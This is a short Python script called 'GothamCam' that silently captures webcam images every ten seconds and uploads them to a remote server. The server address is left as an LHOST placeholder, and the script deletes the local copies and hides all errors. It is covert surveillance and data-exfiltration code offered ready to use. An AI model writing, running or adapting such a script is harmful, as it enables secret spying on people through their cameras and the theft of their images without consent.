#!/usr/bin/env python3
# GothamCam — Powered by Maxime Leal
# pip install opencv-python requests
import cv2, requests, time, os, datetime

LHOST = "FILL_YOUR_SERVER"  # e.g. http://1.2.3.4:5000/upload
INTERVAL = 10  # seconds

def capture_and_send():
    cap = cv2.VideoCapture(0)
    while True:
        ret, frame = cap.read()
        if ret:
            fname = f"/tmp/snap_{datetime.datetime.now().strftime('%H%M%S')}.jpg"
            cv2.imwrite(fname, frame)
            try:
                with open(fname,"rb") as f:
                    requests.post(LHOST, files={"img": f}, timeout=5)
                os.remove(fname)
            except:
                pass
        time.sleep(INTERVAL)

capture_and_send()
